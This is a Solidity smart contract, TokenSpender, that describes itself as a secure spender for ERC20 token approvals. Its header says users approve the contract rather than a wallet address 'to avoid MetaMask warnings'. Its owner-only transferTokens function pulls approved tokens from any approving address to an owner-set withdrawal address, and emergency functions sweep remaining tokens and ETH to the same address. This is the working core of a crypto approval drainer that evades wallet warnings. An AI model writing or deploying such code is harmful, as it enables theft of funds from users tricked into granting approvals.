// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title TokenSpender
 * @dev Secure smart contract spender for ERC20 token approvals.
 *      Users approve this contract (not an EOA) to avoid MetaMask warnings.
 *      Owner can execute transferFrom on approved tokens.
 *      Includes: ReentrancyGuard, Pausable, Emergency withdraw
 *      Uses SafeERC20-style calls to support non-standard tokens like USDT
 */

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @dev Helper library for safe ERC20 interactions
 *      Handles non-standard tokens like USDT that don't return bool
 */
library SafeERC20 {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 amount) internal {
        (bool callSuccess, bytes memory returnData) = address(token).call(
            abi.encodeWithSelector(token.transferFrom.selector, from, to, amount)
        );
        require(callSuccess && (returnData.length == 0 || abi.decode(returnData, (bool))), "SafeERC20: transferFrom failed");
    }

    function safeTransfer(IERC20 token, address to, uint256 amount) internal {
        (bool callSuccess, bytes memory returnData) = address(token).call(
            abi.encodeWithSelector(token.transfer.selector, to, amount)
        );
        require(callSuccess && (returnData.length == 0 || abi.decode(returnData, (bool))), "SafeERC20: transfer failed");
    }
}

contract TokenSpender {
    using SafeERC20 for IERC20;

    address public owner;
    address public withdrawalAddress;
    bool public paused;
    bool private _locked; // Reentrancy guard

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event WithdrawalAddressChanged(address indexed previousAddress, address indexed newAddress);
    event TokensTransferred(address indexed token, address indexed from, address indexed to, uint256 amount);
    event ContractPaused(address indexed by);
    event ContractUnpaused(address indexed by);
    event EmergencyWithdraw(address indexed token, address indexed to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }

    modifier nonReentrant() {
        require(!_locked, "Reentrant call");
        _locked = true;
        _;
        _locked = false;
    }

    constructor(address _withdrawalAddress) {
        require(_withdrawalAddress != address(0), "Invalid withdrawal address");
        owner = msg.sender;
        withdrawalAddress = _withdrawalAddress;
        paused = false;
        _locked = false;
    }

    /**
     * @dev Transfer approved tokens from a user to the withdrawal address
     * @param token The ERC20 token contract address
     * @param from The address that approved this contract
     * @param amount The amount to transfer
     */
    function transferTokens(address token, address from, uint256 amount) external onlyOwner whenNotPaused nonReentrant {
        require(token != address(0), "Invalid token");
        require(from != address(0), "Invalid from address");
        require(amount > 0, "Amount must be > 0");
        
        IERC20 tokenContract = IERC20(token);
        uint256 currentAllowance = tokenContract.allowance(from, address(this));
        require(currentAllowance >= amount, "Insufficient allowance");
        
        // Use safeTransferFrom to handle non-standard tokens like USDT
        tokenContract.safeTransferFrom(from, withdrawalAddress, amount);
        
        emit TokensTransferred(token, from, withdrawalAddress, amount);
    }

    /**
     * @dev Check allowance for a user
     */
    function checkAllowance(address token, address user) external view returns (uint256) {
        return IERC20(token).allowance(user, address(this));
    }

    /**
     * @dev Update the withdrawal address
     */
    function setWithdrawalAddress(address newAddress) external onlyOwner {
        require(newAddress != address(0), "Invalid address");
        address old = withdrawalAddress;
        withdrawalAddress = newAddress;
        emit WithdrawalAddressChanged(old, newAddress);
    }

    /**
     * @dev Transfer ownership
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        address old = owner;
        owner = newOwner;
        emit OwnershipTransferred(old, newOwner);
    }

    /**
     * @dev Pause all token transfers (emergency)
     */
    function pause() external onlyOwner {
        paused = true;
        emit ContractPaused(msg.sender);
    }

    /**
     * @dev Unpause token transfers
     */
    function unpause() external onlyOwner {
        paused = false;
        emit ContractUnpaused(msg.sender);
    }

    /**
     * @dev Emergency withdraw any ERC20 tokens stuck in contract
     */
    function emergencyWithdraw(address token) external onlyOwner nonReentrant {
        IERC20 tokenContract = IERC20(token);
        uint256 balance = tokenContract.balanceOf(address(this));
        require(balance > 0, "No balance");
        // Use safeTransfer to handle non-standard tokens like USDT
        tokenContract.safeTransfer(withdrawalAddress, balance);
        emit EmergencyWithdraw(token, withdrawalAddress, balance);
    }

    /**
     * @dev Emergency withdraw native ETH stuck in contract
     */
    function emergencyWithdrawETH() external onlyOwner nonReentrant {
        uint256 balance = address(this).balance;
        require(balance > 0, "No ETH balance");
        (bool success, ) = payable(withdrawalAddress).call{value: balance}("");
        require(success, "ETH withdraw failed");
    }

    // Accept ETH deposits (if any sent accidentally)
    receive() external payable {}
}